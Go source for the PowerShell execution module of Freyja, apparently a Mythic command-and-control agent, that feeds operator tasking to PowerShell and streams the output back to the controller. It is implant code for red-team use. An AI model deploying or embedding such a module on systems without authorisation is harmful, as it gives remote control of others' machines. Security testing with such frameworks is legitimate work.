package powershell_executor

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	// Freyja

	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
)

// Run - Function that executes the powershell_executor command
func Run(task structs.Task) {
	msg := task.NewResponse()
	pwrshellBin := "powershell"
	arg1 := "-nologo"
	arg2 := "-noprofile"
	if _, err := exec.LookPath(pwrshellBin); err != nil {
		msg.SetError("Could not find powershell.exe ")
		task.Job.SendResponses <- msg
		return
	}

	command := exec.Command(pwrshellBin, arg1, arg2)
	command.Stdin = strings.NewReader(task.Params)
	command.Env = os.Environ()

	stdout, err := command.StdoutPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	stderr, err := command.StderrPipe()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}

	stdoutScanner := bufio.NewScanner(stdout)
	stderrScanner := bufio.NewScanner(stderr)
	outputChannel := make(chan string, 1)
	doneChannel := make(chan bool)
	finishedReadingOutput := make(chan bool)
	doneTimeDelayChannel := make(chan bool)
	sendTimeDelayChannel := make(chan bool)
	go func() {
		bufferedOutput := ""
		doneCount := 0
		for {
			select {
			case <-doneChannel:
				doneCount += 1
				if doneCount == 2 {
					outputMsg := task.NewResponse()
					outputMsg.Completed = true
					if bufferedOutput != "" {
						outputMsg.UserOutput = bufferedOutput
					} else {
						msg.UserOutput = fmt.Sprintf("No Output From Command")
					}
					task.Job.SendResponses <- outputMsg
					doneTimeDelayChannel <- true
					finishedReadingOutput <- true
					return
				}
			case newBufferedOutput := <-outputChannel:
				bufferedOutput += newBufferedOutput
			case <-sendTimeDelayChannel:
				if bufferedOutput != "" {
					outputMsg := task.NewResponse()
					outputMsg.UserOutput = bufferedOutput
					task.Job.SendResponses <- outputMsg
					bufferedOutput = ""
				}
			}
		}
	}()
	go func() {
		for stdoutScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stdoutScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for stderrScanner.Scan() {
			outputChannel <- fmt.Sprintf("%s\n", stderrScanner.Text())
		}
		doneChannel <- true
	}()
	go func() {
		for {
			select {
			case <-doneTimeDelayChannel:
				return
			case <-time.After(5 * time.Second):
				sendTimeDelayChannel <- true
			}
		}
	}()
	err = command.Start()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	// Need to finish reading stdout/stderr before calling .Wait()
	<-finishedReadingOutput
	err = command.Wait()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	return
}
